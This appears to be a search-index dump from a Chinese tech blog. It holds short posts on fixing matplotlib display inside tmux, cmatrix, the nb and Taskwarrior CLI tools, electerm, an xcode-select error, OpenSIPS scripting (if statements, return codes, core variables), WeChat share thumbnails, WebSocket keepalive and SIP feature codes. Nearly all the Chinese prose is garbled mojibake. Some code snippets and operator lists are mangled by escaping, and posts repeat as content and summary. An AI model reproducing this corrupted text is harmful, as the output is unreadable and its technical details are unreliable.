plt.plot([1.6, 2.7]) plt.show() å¹¶ä¸”æœ‰ä¸‹é¢çš„æŠ¥é”™\ncannot load backend \u0026lsquo;qt5agg\u0026rsquo; which requires the \u0026lsquo;qt5\u0026rsquo; interactive framework, as \u0026lsquo;headless\u0026rsquo; is currently running\nçœ‹èµ·æ¥ä¼¼ä¹æ˜¯backendæ²¡æœ‰è®¾ç½®æœ‰å…³ã€‚æŸ¥äº†äº›èµ„æ–™ï¼Œè®¾ç½®äº†è¿˜æ˜¯ä¸è¡Œã€‚\næœ€åå¶ç„¶å‘ç°ï¼Œæˆ‘æ‰§è¡Œpython éƒ½æ˜¯åœ¨tmuxé‡Œé¢æ‰§è¡Œçš„ï¼Œå¦‚æœä¸å†tmuxä¼šè¯é‡Œé¢æ‰§è¡Œï¼Œå›¾ç‰‡å°±èƒ½æ­£å¸¸æ˜¾ç¤ºã€‚\né—®é¢˜ä»è®¾ç½®backend, åˆ‡æ¢åˆ°tmuxçš„ä¼šè¯ã€‚\næŸ¥åˆ°sfä¸Šæ­£å¥½æœ‰ç›¸å…³çš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯åœ¨tmuxé‡Œé¢PATHç¯å¢ƒå˜é‡å¼•èµ·çš„é—®é¢˜ã€‚\né—®é¢˜ç»™çš„å»ºè®®æ˜¯æŠŠä¸‹é¢çš„ä»£ç å†™å…¥.bashrcä¸­ï¼Œ\nIf you\u0026rsquo;re on a Mac and have been wondering why /usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin keeps getting prepended to PATH when you run tmux, it\u0026rsquo;s because of a utility called path_helper that\u0026rsquo;s run from your /etc/profile file.\nYou can\u0026rsquo;t easily persuade tmux (or rather, bash) not to source /etc/profile (for some reason tmux always runs as a login shell, which means /etc/profile will be read), but you can make sure that the effects of path_helper don\u0026rsquo;t screw with your PATH.\nThe trick is to make sure that PATH is empty before path_helper runs. In my ~/.bash_profile file I have this:\nif [ -f /etc/profile ]; then PATH=\u0026quot;\u0026quot; source /etc/profile fi\n\u0026gt; Clearing PATH before path_helper executes will prevent it from prepending the default PATH to your (previously) chosen PATH, and will allow the rest of your personal bash setup scripts (commands further down `.bash_profile`, or in `.bashrc` if you\u0026#39;ve sourced it from `.bash_profile`) to setup your PATH accordingly. \u0026gt; ```bash if [ -f /etc/profile ]; then PATH=\u0026#34;\u0026#34; source /etc/profile fi cat /etc/profile # æˆ‘æœ‰è¿™ä¸ªæ–‡ä»¶ PATH=\u0026#34;\u0026#34; source /etc/profile æ€»æ˜¯ï¼ŒæŒ‰ç…§sfä¸Šçš„æ“ä½œï¼Œæˆ‘çš„é—®é¢˜è§£å†³äº†ï¼Œå›¾ç‰‡å¼¹å‡ºäº†ã€‚\nå‚è€ƒ https://stackoverflow.com/questions/62423342/python-plot-in-tmux-session-not-showing https://blog.csdn.net/Meditator_hkx/article/details/59106752 https://superuser.com/questions/544989/does-tmux-sort-the-path-variable ","permalink":"https://wdd.js.org/posts/2021/03/pqreg4/","summary":"å­¦ä¹ matplotlibç»˜å›¾æ—¶ï¼Œä»£ç å¦‚ä¸‹ï¼Œæ‰§è¡Œè¿‡åï¼Œå›¾ç‰‡å¼¹çª—æ²¡æœ‰å¼¹å‡ºã€‚\nimport matplotlib.pyplot as plt import matplotlib plt.plot([1.6, 2.7]) plt.show() å¹¶ä¸”æœ‰ä¸‹é¢çš„æŠ¥é”™\ncannot load backend \u0026lsquo;qt5agg\u0026rsquo; which requires the \u0026lsquo;qt5\u0026rsquo; interactive framework, as \u0026lsquo;headless\u0026rsquo; is currently running\nçœ‹èµ·æ¥ä¼¼ä¹æ˜¯backendæ²¡æœ‰è®¾ç½®æœ‰å…³ã€‚æŸ¥äº†äº›èµ„æ–™ï¼Œè®¾ç½®äº†è¿˜æ˜¯ä¸è¡Œã€‚\næœ€åå¶ç„¶å‘ç°ï¼Œæˆ‘æ‰§è¡Œpython éƒ½æ˜¯åœ¨tmuxé‡Œé¢æ‰§è¡Œçš„ï¼Œå¦‚æœä¸å†tmuxä¼šè¯é‡Œé¢æ‰§è¡Œï¼Œå›¾ç‰‡å°±èƒ½æ­£å¸¸æ˜¾ç¤ºã€‚\né—®é¢˜ä»è®¾ç½®backend, åˆ‡æ¢åˆ°tmuxçš„ä¼šè¯ã€‚\næŸ¥åˆ°sfä¸Šæ­£å¥½æœ‰ç›¸å…³çš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯åœ¨tmuxé‡Œé¢PATHç¯å¢ƒå˜é‡å¼•èµ·çš„é—®é¢˜ã€‚\né—®é¢˜ç»™çš„å»ºè®®æ˜¯æŠŠä¸‹é¢çš„ä»£ç å†™å…¥.bashrcä¸­ï¼Œ\nIf you\u0026rsquo;re on a Mac and have been wondering why /usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin keeps getting prepended to PATH when you run tmux, it\u0026rsquo;s because of a utility called path_helper that\u0026rsquo;s run from your /etc/profile file.\nYou can\u0026rsquo;t easily persuade tmux (or rather, bash) not to source /etc/profile (for some reason tmux always runs as a login shell, which means /etc/profile will be read), but you can make sure that the effects of path_helper don\u0026rsquo;t screw with your PATH.","title":"matplotlibå›¾ç‰‡å¼¹çª—æ²¡æœ‰å¼¹å‡º"},{"content":"å‚è€ƒ http://coding-geek.com/how-shazam-works/ https://blog.csdn.net/yutianzuijin/article/details/49787551 http://hpac.cs.umu.se/teaching/sem-mus-17/Reports/Froitzheim.pdf https://github.com/sfluor/musig ","permalink":"https://wdd.js.org/posts/2021/03/phgwbe/","summary":"å‚è€ƒ http://coding-geek.com/how-shazam-works/ https://blog.csdn.net/yutianzuijin/article/details/49787551 http://hpac.cs.umu.se/teaching/sem-mus-17/Reports/Froitzheim.pdf https://github.com/sfluor/musig ","title":"#shazamç®—æ³•åˆ†æ"},{"content":"å®‰è£… sudo apt install cmatrix å¸®åŠ©æ–‡æ¡£ âœ ~ cmatrix --help Usage: cmatrix -[abBcfhlsmVx] [-u delay] [-C color] -a: Asynchronous scroll -b: Bold characters on -B: All bold characters (overrides -b) -c: Use Japanese characters as seen in the original matrix. Requires appropriate fonts -f: Force the linux $TERM type to be on -l: Linux mode (uses matrix console font) -L: Lock mode (can be closed from another terminal) -o: Use old-style scrolling -h: Print usage and exit -n: No bold characters (overrides -b and -B, default) -s: \u0026#34;Screensaver\u0026#34; mode, exits on first keystroke -x: X window mode, use if your xterm is using mtx.pcf -V: Print version information and exit -u delay (0 - 10, default 4): Screen update delay -C [color]: Use this color for matrix (default green) -r: rainbow mode -m: lambda mode ","permalink":"https://wdd.js.org/posts/2021/03/fgutiw/","summary":"å®‰è£… sudo apt install cmatrix å¸®åŠ©æ–‡æ¡£ âœ ~ cmatrix --help Usage: cmatrix -[abBcfhlsmVx] [-u delay] [-C color] -a: Asynchronous scroll -b: Bold characters on -B: All bold characters (overrides -b) -c: Use Japanese characters as seen in the original matrix. Requires appropriate fonts -f: Force the linux $TERM type to be on -l: Linux mode (uses matrix console font) -L: Lock mode (can be closed from another terminal) -o: Use old-style scrolling -h: Print usage and exit -n: No bold characters (overrides -b and -B, default) -s: \u0026#34;Screensaver\u0026#34; mode, exits on first keystroke -x: X window mode, use if your xterm is using mtx.","title":"é»‘å®¢å¸å›½ç»ˆç«¯å­—ç¬¦ç€‘å¸ƒ"},{"content":"nbæ˜¯ä¸€ä¸ªåŸºäºå‘½ä»¤è¡Œçš„ç¬”è®°æœ¬å·¥å…·ï¼ŒåŠŸèƒ½å¾ˆå¼ºå¤§ã€‚\nè®°ç¬”è®°ä½•é¡»ç¦»å¼€ç»ˆç«¯ï¼Ÿ\nç‰¹ç‚¹ plain-text data storage, encryption, filtering and search, Git-backed versioning and syncing, Pandoc-backed conversion, global and local notebooks, customizable color themes, extensibility through plugins, æ”¯æŒå„ç§ç¼–è¾‘å™¨æ‰“å¼€ç¬”è®°ï¼Œ æˆ‘è‡ªç„¶ç”¨VIMäº†ã€‚\nA text editor with command line support, such as:Vim,Emacs,Visual Studio Code,Sublime Text,micro,nano,Atom,TextMate,MacDown,some of these,and many of these.\nä½¿ç”¨ä½“éªŒæˆªå›¾ å‚è€ƒ https://xwmx.github.io/nb/ https://github.com/xwmx/nb ","permalink":"https://wdd.js.org/posts/2021/03/dtas0p/","summary":"nbæ˜¯ä¸€ä¸ªåŸºäºå‘½ä»¤è¡Œçš„ç¬”è®°æœ¬å·¥å…·ï¼ŒåŠŸèƒ½å¾ˆå¼ºå¤§ã€‚\nè®°ç¬”è®°ä½•é¡»ç¦»å¼€ç»ˆç«¯ï¼Ÿ\nç‰¹ç‚¹ plain-text data storage, encryption, filtering and search, Git-backed versioning and syncing, Pandoc-backed conversion, global and local notebooks, customizable color themes, extensibility through plugins, æ”¯æŒå„ç§ç¼–è¾‘å™¨æ‰“å¼€ç¬”è®°ï¼Œ æˆ‘è‡ªç„¶ç”¨VIMäº†ã€‚\nA text editor with command line support, such as:Vim,Emacs,Visual Studio Code,Sublime Text,micro,nano,Atom,TextMate,MacDown,some of these,and many of these.\nä½¿ç”¨ä½“éªŒæˆªå›¾ å‚è€ƒ https://xwmx.github.io/nb/ https://github.com/xwmx/nb ","title":"å‘½ä»¤è¡Œç¬”è®°æœ¬ nb è®°ç¬”è®°ä½•é¡»ç¦»å¼€ç»ˆç«¯ï¼Ÿ"},{"content":"ç®€ä»‹ Taskwarrioræ˜¯å‘½ä»¤è¡Œä¸‹çš„todolist, ç‰¹ç‚¹æ˜¯å¿«é€Ÿé«˜æ•ˆä¸”åŠŸèƒ½å¼ºå¤§ï¼Œ\næ”¯æŒé¡¹ç›®ç»„ æ”¯æŒç‡ƒçƒ§å›¾ æ”¯æŒå„ç§ç±»ä¼¼SQLçš„è¯­æ³•è¿‡æ»¤ æ”¯æŒå„ç§ç»Ÿè®¡æŠ¥è¡¨ å®‰è£… sudo apt-get install taskwarrior ä½¿ç”¨è¯´æ˜ å¢åŠ Todo task add åˆ†æœºæ³¨å†Œæµ‹è¯• due:today Created task 1. æ˜¾ç¤ºTodoList âœ ~ task list ID Age Due Description Urg 1 5s 2021-03-25 åˆ†æœºæ³¨å†Œæµ‹è¯• 8.98 å¼€å§‹ä¸€ä¸ªä»»åŠ¡ âœ ~ task 1 start Starting task 1 \u0026#39;åˆ†æœºæ³¨å†Œæµ‹è¯•\u0026#39;. Started 1 task. âœ ~ task ls ID A Due Description 1 * 9h åˆ†æœºæ³¨å†Œæµ‹è¯• æ ‡è®°å®Œæˆä¸€ä¸ªä»»åŠ¡ âœ ~ task 1 done Completed task 1 \u0026#39;åˆ†æœºæ³¨å†Œæµ‹è¯•\u0026#39;. Completed 1 task. # ä»»åŠ¡å®Œæˆå task lså°†ä¸ä¼šæ˜¾ç¤ºå·²ç»å®Œæˆçš„ä»»åŠ¡ âœ ~ task ls No matches. # å¯ä»¥ä½¿ç”¨task all æŸ¥çœ‹æ‰€æœ‰çš„todolist âœ ~ task all ID St UUID A Age Done Project Due Description - C 341a0f48 2min 55s 2021-03-25 åˆ†æœºæ³¨å†Œæµ‹è¯• ç‡ƒçƒ§å›¾ # æŒ‰å¤©çš„ç‡ƒçƒ§å›¾ task burndown.daily # æŒ‰æœˆçš„ç‡ƒçƒ§å›¾ task burndown.monthly # æŒ‰å‘¨çš„ç‡ƒçƒ§å›¾ task burndown.weekly æ—¥å† task calendar æ›´å¤šä»‹ç» æ›´å¤šå¥½ç©çš„ä¸œè¥¿ï¼Œå¯ä»¥å»çœ‹çœ‹å®˜æ–¹çš„ä½¿ç”¨è¯´æ˜æ–‡æ¡£ https://taskwarrior.org/docs/\nå‚è€ƒ https://taskwarrior.org/ æ›´å¤šå‘½ä»¤ https://taskwarrior.org/docs/commands/ ","permalink":"https://wdd.js.org/posts/2021/03/yyz3ca/","summary":"ç®€ä»‹ Taskwarrioræ˜¯å‘½ä»¤è¡Œä¸‹çš„todolist, ç‰¹ç‚¹æ˜¯å¿«é€Ÿé«˜æ•ˆä¸”åŠŸèƒ½å¼ºå¤§ï¼Œ\næ”¯æŒé¡¹ç›®ç»„ æ”¯æŒç‡ƒçƒ§å›¾ æ”¯æŒå„ç§ç±»ä¼¼SQLçš„è¯­æ³•è¿‡æ»¤ æ”¯æŒå„ç§ç»Ÿè®¡æŠ¥è¡¨ å®‰è£… sudo apt-get install taskwarrior ä½¿ç”¨è¯´æ˜ å¢åŠ Todo task add åˆ†æœºæ³¨å†Œæµ‹è¯• due:today Created task 1. æ˜¾ç¤ºTodoList âœ ~ task list ID Age Due Description Urg 1 5s 2021-03-25 åˆ†æœºæ³¨å†Œæµ‹è¯• 8.98 å¼€å§‹ä¸€ä¸ªä»»åŠ¡ âœ ~ task 1 start Starting task 1 \u0026#39;åˆ†æœºæ³¨å†Œæµ‹è¯•\u0026#39;. Started 1 task. âœ ~ task ls ID A Due Description 1 * 9h åˆ†æœºæ³¨å†Œæµ‹è¯• æ ‡è®°å®Œæˆä¸€ä¸ªä»»åŠ¡ âœ ~ task 1 done Completed task 1 \u0026#39;åˆ†æœºæ³¨å†Œæµ‹è¯•\u0026#39;.","title":"Taskwarrior å‘½ä»¤è¡Œä¸‹çš„ä¸“ä¸šTodoListç¥å™¨"},{"content":"https://electerm.github.io/electerm/\nåŠŸèƒ½ç‰¹ç‚¹ Work as a terminal/file manager or ssh/sftp client(similar to xshell) Global hotkey to toggle window visibility (simliar to guake, default is ctrl + 2) Multi platform(linux, mac, win) ğŸ‡ºğŸ‡¸Â ğŸ‡¨ğŸ‡³Â ğŸ‡§ğŸ‡·Â ğŸ‡·ğŸ‡ºÂ ğŸ‡ªğŸ‡¸Â ğŸ‡«ğŸ‡·Â ğŸ‡¹ğŸ‡·Â ğŸ‡­ğŸ‡°Â ğŸ‡¯ğŸ‡µÂ Support multi-language(electerm-locales, contribute/fix welcome) Double click to directly edit remote file(small ones). Edit local file with built-in editor(small ones). Auth with publickey + password. Zmodem(rz, sz). Transparent window(Mac, win). Terminal background image. Global/session proxy. Quick commands Sync bookmarks/themes/quick commands to github/gitee secret gist Serial Port support(removed after version 1.10.14) Quick input to one or all terminal Command line usage: check wiki ","permalink":"https://wdd.js.org/posts/2021/03/tigv1h/","summary":"https://electerm.github.io/electerm/\nåŠŸèƒ½ç‰¹ç‚¹ Work as a terminal/file manager or ssh/sftp client(similar to xshell) Global hotkey to toggle window visibility (simliar to guake, default is ctrl + 2) Multi platform(linux, mac, win) ğŸ‡ºğŸ‡¸Â ğŸ‡¨ğŸ‡³Â ğŸ‡§ğŸ‡·Â ğŸ‡·ğŸ‡ºÂ ğŸ‡ªğŸ‡¸Â ğŸ‡«ğŸ‡·Â ğŸ‡¹ğŸ‡·Â ğŸ‡­ğŸ‡°Â ğŸ‡¯ğŸ‡µÂ Support multi-language(electerm-locales, contribute/fix welcome) Double click to directly edit remote file(small ones). Edit local file with built-in editor(small ones). Auth with publickey + password. Zmodem(rz, sz). Transparent window(Mac, win). Terminal background image.","title":"electerm å…è´¹å¼€æºè·¨å¹³å°ä¸”åŠŸèƒ½å¼ºå¤§çš„sshå·¥å…·"},{"content":"xcode-select --install å‚è€ƒ https://www.jianshu.com/p/50b6771eb853 ","permalink":"https://wdd.js.org/posts/2021/03/ibv4tb/","summary":"xcode-select --install å‚è€ƒ https://www.jianshu.com/p/50b6771eb853 ","title":"macå‡çº§åå‘½ä»¤è¡ŒæŠ¥é”™ xcrun: error: invalid active developer path"},{"content":"if if (expr) { actions } else { actions; } if (expr) { actions } else if (expr) { actions; } è¡¨è¾¾å¼æ“ä½œç¬¦å· å¸¸ç”¨çš„ç”¨é»„è‰²æ ‡è®°ã€‚\n== ç­‰äº != ä¸ç­‰äº =~ æ­£åˆ™åŒ¹é… $rU =~ '^1800*'Â is \u0026ldquo;$rU begins with 1800\u0026rdquo; !~ æ­£åˆ™ä¸åŒ¹é… å¤§äº\n= å¤§äºç­‰äº\n\u0026lt; å°äº \u0026lt;= å°äºç­‰äº \u0026amp;\u0026amp; é€»è¾‘ä¸ **|| **é€»è¾‘æˆ– **! **é€»è¾‘é [ \u0026hellip; ] - test operator - inside can be any arithmetic expression å…¶ä»– å‡ºäº†å¸¸è§çš„ifè¯­å¥ï¼Œopensipsè¿˜æ”¯æŒswitch, while, for each, å› ä¸ºç”¨çš„æ¯”è¾ƒå°‘ã€‚å„ä½å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£è¯´æ˜ã€‚\nhttps://www.opensips.org/Documentation/Script-Statements-2-4\n","permalink":"https://wdd.js.org/opensips/ch5/statement/","summary":"if if (expr) { actions } else { actions; } if (expr) { actions } else if (expr) { actions; } è¡¨è¾¾å¼æ“ä½œç¬¦å· å¸¸ç”¨çš„ç”¨é»„è‰²æ ‡è®°ã€‚\n== ç­‰äº != ä¸ç­‰äº =~ æ­£åˆ™åŒ¹é… $rU =~ '^1800*'Â is \u0026ldquo;$rU begins with 1800\u0026rdquo; !~ æ­£åˆ™ä¸åŒ¹é… å¤§äº\n= å¤§äºç­‰äº\n\u0026lt; å°äº \u0026lt;= å°äºç­‰äº \u0026amp;\u0026amp; é€»è¾‘ä¸ **|| **é€»è¾‘æˆ– **! **é€»è¾‘é [ \u0026hellip; ] - test operator - inside can be any arithmetic expression å…¶ä»– å‡ºäº†å¸¸è§çš„ifè¯­å¥ï¼Œopensipsè¿˜æ”¯æŒswitch, while, for each, å› ä¸ºç”¨çš„æ¯”è¾ƒå°‘ã€‚å„ä½å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£è¯´æ˜ã€‚","title":"å¸¸ç”¨è¯­å¥"},{"content":"ä½¿ç”¨return(int)è¯­å¥å¯ä»¥è¿”å›æ•´æ•°å€¼ã€‚\nreturn(0) ç›¸å½“äºexit(), åç»­çš„è·¯ç”±éƒ½ä¸åœ¨æ‰§è¡Œ return(æ­£æ•´æ•°) åç»­çš„è·¯ç”±è¿˜ä¼šç»§ç»­æ‰§è¡Œï¼Œifæµ‹è¯•ä¸ºtrue return(è´Ÿæ•´æ•°) åç»­çš„è·¯ç”±è¿˜ä¼šç»§ç»­æ‰§è¡Œ, ifæµ‹è¯•ä¸ºfalse å¯ä»¥ä½¿ç”¨ $rcÂ æˆ–è€… $retcodeÂ è·å–ä¸Šä¸€ä¸ªè·¯ç”±çš„è¿”å›å€¼ # è¯·æ±‚è·¯ç”± route{ route(check_is_feature_code); xlog(\u0026#34;check_is_feature_code return code is $rc\u0026#34;); ... ... route(some_other_check); } route[check_is_feature_code]{ if ($rU !~ \u0026#34;^\\*[0-9]+\u0026#34;) { xlog(\u0026#34;check_is_feature_code: is not feature code $rU\u0026#34;); # éfeature code, æå‰è¿”å› return(1); } # ä¸‹é¢å°±æ˜¯feature codeçš„å¤„ç† ...... } route[some_other_check]{ ... } ","permalink":"https://wdd.js.org/opensips/ch5/return/","summary":"ä½¿ç”¨return(int)è¯­å¥å¯ä»¥è¿”å›æ•´æ•°å€¼ã€‚\nreturn(0) ç›¸å½“äºexit(), åç»­çš„è·¯ç”±éƒ½ä¸åœ¨æ‰§è¡Œ return(æ­£æ•´æ•°) åç»­çš„è·¯ç”±è¿˜ä¼šç»§ç»­æ‰§è¡Œï¼Œifæµ‹è¯•ä¸ºtrue return(è´Ÿæ•´æ•°) åç»­çš„è·¯ç”±è¿˜ä¼šç»§ç»­æ‰§è¡Œ, ifæµ‹è¯•ä¸ºfalse å¯ä»¥ä½¿ç”¨ $rcÂ æˆ–è€… $retcodeÂ è·å–ä¸Šä¸€ä¸ªè·¯ç”±çš„è¿”å›å€¼ # è¯·æ±‚è·¯ç”± route{ route(check_is_feature_code); xlog(\u0026#34;check_is_feature_code return code is $rc\u0026#34;); ... ... route(some_other_check); } route[check_is_feature_code]{ if ($rU !~ \u0026#34;^\\*[0-9]+\u0026#34;) { xlog(\u0026#34;check_is_feature_code: is not feature code $rU\u0026#34;); # éfeature code, æå‰è¿”å› return(1); } # ä¸‹é¢å°±æ˜¯feature codeçš„å¤„ç† ...... } route[some_other_check]{ ... } ","title":"ä½¿ç”¨returnè¯­å¥å‡å°‘é€»è¾‘åµŒå¥—"},{"content":"$ru $rU å¯è¯»å¯å†™ä»¥ä¸‹é¢çš„sip URLä¸¾ä¾‹\nsip:8001@test.cc;a=1;b=2 $ru ä»£è¡¨æ•´ä¸ªsip urlå°±æ˜¯ sip:8001@test.cc;a=1;b=2 $rUä»£è¡¨ç”¨æˆ·éƒ¨åˆ†ï¼Œå°±æ˜¯8001 **\n$du å¯è¯»å¯å†™\n$du = \u0026#34;sip:192.468.2.40\u0026#34;; $duå¯ä»¥ç†è§£ä¸ºå¤–å‘¼ä»£ç†ï¼Œæˆ‘ä»¬æƒ³è®©è¿™ä¸ªè¯·æ±‚å‘åˆ°ä¸‹ä¸€ä¸ªsipæœåŠ¡å™¨ï¼Œå°±æŠŠ$duè®¾ç½®ä¸ºä¸‹ä¸€è·³çš„åœ°å€ã€‚\n","permalink":"https://wdd.js.org/opensips/ch5/core-var/","summary":"$ru $rU å¯è¯»å¯å†™ä»¥ä¸‹é¢çš„sip URLä¸¾ä¾‹\nsip:8001@test.cc;a=1;b=2 $ru ä»£è¡¨æ•´ä¸ªsip urlå°±æ˜¯ sip:8001@test.cc;a=1;b=2 $rUä»£è¡¨ç”¨æˆ·éƒ¨åˆ†ï¼Œå°±æ˜¯8001 **\n$du å¯è¯»å¯å†™\n$du = \u0026#34;sip:192.468.2.40\u0026#34;; $duå¯ä»¥ç†è§£ä¸ºå¤–å‘¼ä»£ç†ï¼Œæˆ‘ä»¬æƒ³è®©è¿™ä¸ªè¯·æ±‚å‘åˆ°ä¸‹ä¸€ä¸ªsipæœåŠ¡å™¨ï¼Œå°±æŠŠ$duè®¾ç½®ä¸ºä¸‹ä¸€è·³çš„åœ°å€ã€‚","title":"æ ¸å¿ƒå˜é‡è¯´æ˜"},{"content":"headeréƒ¨åˆ†\n\u0026lt;meta property=\u0026#34;og:image\u0026#34; content=\u0026#34;http://abc.cc/x.jpg\u0026#34; /\u0026gt; bodyéƒ¨åˆ†\n\u0026lt;div style=\u0026#34;display:none\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;http://abc.cc/x.jpg\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; æ³¨æ„ï¼Œå›¾ç‰‡çš„è¿æ¥ï¼Œå¿…é¡»æ˜¯ç»å¯¹åœ°å€ã€‚å°±æ˜¯æ ¼å¼å¿…éœ€ä»¥httpå¼€å¤´çš„åœ°å€ï¼Œä¸èƒ½ç”¨ç›¸å¯¹åœ°å€ï¼Œå¦åˆ™ç¼©ç•¥å›¾ä¸ä¼šæ˜¾ç¤ºã€‚\n","permalink":"https://wdd.js.org/posts/2021/03/rggbsl/","summary":"headeréƒ¨åˆ†\n\u0026lt;meta property=\u0026#34;og:image\u0026#34; content=\u0026#34;http://abc.cc/x.jpg\u0026#34; /\u0026gt; bodyéƒ¨åˆ†\n\u0026lt;div style=\u0026#34;display:none\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;http://abc.cc/x.jpg\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; æ³¨æ„ï¼Œå›¾ç‰‡çš„è¿æ¥ï¼Œå¿…é¡»æ˜¯ç»å¯¹åœ°å€ã€‚å°±æ˜¯æ ¼å¼å¿…éœ€ä»¥httpå¼€å¤´çš„åœ°å€ï¼Œä¸èƒ½ç”¨ç›¸å¯¹åœ°å€ï¼Œå¦åˆ™ç¼©ç•¥å›¾ä¸ä¼šæ˜¾ç¤ºã€‚","title":"ç½‘é¡µåˆ†äº«åˆ°å¾®ä¿¡æ·»åŠ ç¼©ç•¥å›¾"},{"content":"æµ‹è¯•ç›®æ ‡æœåŠ¡å™¨ http://www.websocket-test.com/ï¼Œ è¯¥æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯æœªåŠ å¯†çš„wsåè®®ã€‚\næ‰“å¼€è¿™ä¸ªé¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªé¡µé¢å‘èµ·äº†è¿æ¥åˆ°ws://121.40.165.18:8800/ çš„websocketè¿æ¥ã€‚\nç„¶åçœ‹ä¸‹é‡Œé¢çš„æ¶ˆæ¯ï¼Œéƒ½æ˜¯æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯ã€‚\né€šè¿‡wiresharkåˆ†æ\nå•ç‹¬çš„websocketä¹Ÿæ˜¯èƒ½å¤Ÿçœ‹åˆ°æœåŠ¡ç«¯ä¸‹å‘çš„æ¶ˆæ¯çš„ã€‚\nkeepalive è¦ç‚¹å…³æ³¨ æ¯éš”å¤§çº¦45ç§’ï¼Œå®¢æˆ·ç«¯ä¼šåƒæœåŠ¡ç«¯å‘é€ä¸€ä¸ªkeep aliveåŒ…ã€‚æœåŠ¡ç«¯ä¹Ÿä¼šéå¸¸å¿«çš„å›å¤ä¸€ä¸ªå¿ƒè·³åŒ… ","permalink":"https://wdd.js.org/network/pz06t2/","summary":"æµ‹è¯•ç›®æ ‡æœåŠ¡å™¨ http://www.websocket-test.com/ï¼Œ è¯¥æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯æœªåŠ å¯†çš„wsåè®®ã€‚\næ‰“å¼€è¿™ä¸ªé¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªé¡µé¢å‘èµ·äº†è¿æ¥åˆ°ws://121.40.165.18:8800/ çš„websocketè¿æ¥ã€‚\nç„¶åçœ‹ä¸‹é‡Œé¢çš„æ¶ˆæ¯ï¼Œéƒ½æ˜¯æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯ã€‚\né€šè¿‡wiresharkåˆ†æ\nå•ç‹¬çš„websocketä¹Ÿæ˜¯èƒ½å¤Ÿçœ‹åˆ°æœåŠ¡ç«¯ä¸‹å‘çš„æ¶ˆæ¯çš„ã€‚\nkeepalive è¦ç‚¹å…³æ³¨ æ¯éš”å¤§çº¦45ç§’ï¼Œå®¢æˆ·ç«¯ä¼šåƒæœåŠ¡ç«¯å‘é€ä¸€ä¸ªkeep aliveåŒ…ã€‚æœåŠ¡ç«¯ä¹Ÿä¼šéå¸¸å¿«çš„å›å¤ä¸€ä¸ªå¿ƒè·³åŒ… ","title":"websocket tcp keepalive æœºåˆ¶è°ƒç ”"},{"content":"åŠŸèƒ½æè¿° ç”¨æˆ·å¯ä»¥æ‹¨æ‰“ä¸€ä¸ªç‰¹æ®Šçš„å·ç ï¼Œç”¨æ¥è§¦å‘ç‰¹å®šçš„åŠŸèƒ½ã€‚å¸¸è§çš„åŠŸèƒ½ç ä¸€èˆ¬ä»¥ *Â å¼€å¤´ï¼Œä¾‹å¦‚\n*1Â ç»„å†…ä»£æ¥ *1(EXT) ä»£æ¥æŒ‡å®šçš„åˆ†æœº *2Â å‘¼å«è½¬ç§» **87Â è¯·å‹¿æ‰“æ‰° \u0026hellip; ä¸Šé¢çš„æ —å­ï¼Œå…·ä½“çš„åŠŸèƒ½ç ï¼Œå¯¹åº”çš„ä¸šåŠ¡é€»è¾‘æ˜¯å¯é…ç½®çš„ã€‚\nåœºæ™¯ä¸¾ä¾‹ æˆ‘çš„åˆ†æœºæ˜¯8001ï¼Œæˆ‘çœ‹åˆ°8008çš„åˆ†æœºæ­£åœ¨æŒ¯é“ƒï¼Œæ­¤æ—¶æˆ‘éœ€è¦æŠŠç”µè¯æ¥èµ·æ¥ã€‚ä½†æ˜¯æˆ‘ä¸èƒ½èµ°åˆ°8008çš„å·¥ä½ä¸Šå»æ¥ç”µè¯ï¼Œæˆ‘å¿…é¡»è¦åœ¨è‡ªå·±çš„å·¥ä½ä¸Šæ¥ç”µè¯ã€‚\né‚£ä¹ˆæˆ‘åœ¨è‡ªå·±çš„åˆ†æœºä¸Šè¾“å…¥*18008Â è¿™æ—¶SIPæœåŠ¡ç«¯å°±çŸ¥é“ä½ æƒ³ä»£8008æ¥å¬æ­£åœ¨æŒ¯é“ƒçš„ç”µè¯ã€‚\nè¯´èµ·æ¥åŠŸèƒ½ç å°±æ˜¯ä¸€ç§ä½¿ç”¨è¯æœºä¸ŠæŒ‰é”®çš„ä¸€ç»„æš—å·ã€‚\nè¯æœºä¸Šä¸€èˆ¬åªæœ‰0-9*#ï¼Œä¸€å…±12ä¸ªæŒ‰é”®ã€‚æ²¡æ³•åŠç”¨å…¶ä»–çš„ç¼–ç å‘Šè¯‰æœåŠ¡ç«¯è‡ªå·±æƒ³åšä»€ä¹ˆï¼Œæ‰€ä»¥åªèƒ½ç”¨åŠŸèƒ½ç ã€‚\nå‚è€ƒ https://www.ipcomms.net/support/myoffice-pbx/feature-codes https://www.cisco.com/c/en/us/td/docs/voice_ip_comm/cucme/admin/configuration/manual/cmeadm/cmefacs.pdf https://help.yeastar.com/en/s-series/topic/feature_code.html?hl=feature%2Ccode\u0026amp;_ga=2.76562834.622619423.1615949948-1155631884.1615949948 ","permalink":"https://wdd.js.org/opensips/ch9/feature-code/","summary":"åŠŸèƒ½æè¿° ç”¨æˆ·å¯ä»¥æ‹¨æ‰“ä¸€ä¸ªç‰¹æ®Šçš„å·ç ï¼Œç”¨æ¥è§¦å‘ç‰¹å®šçš„åŠŸèƒ½ã€‚å¸¸è§çš„åŠŸèƒ½ç ä¸€èˆ¬ä»¥ *Â å¼€å¤´ï¼Œä¾‹å¦‚\n*1Â ç»„å†…ä»£æ¥ *1(EXT) ä»£æ¥æŒ‡å®šçš„åˆ†æœº *2Â å‘¼å«è½¬ç§» **87Â è¯·å‹¿æ‰“æ‰° \u0026hellip; ä¸Šé¢çš„æ —å­ï¼Œå…·ä½“çš„åŠŸèƒ½ç 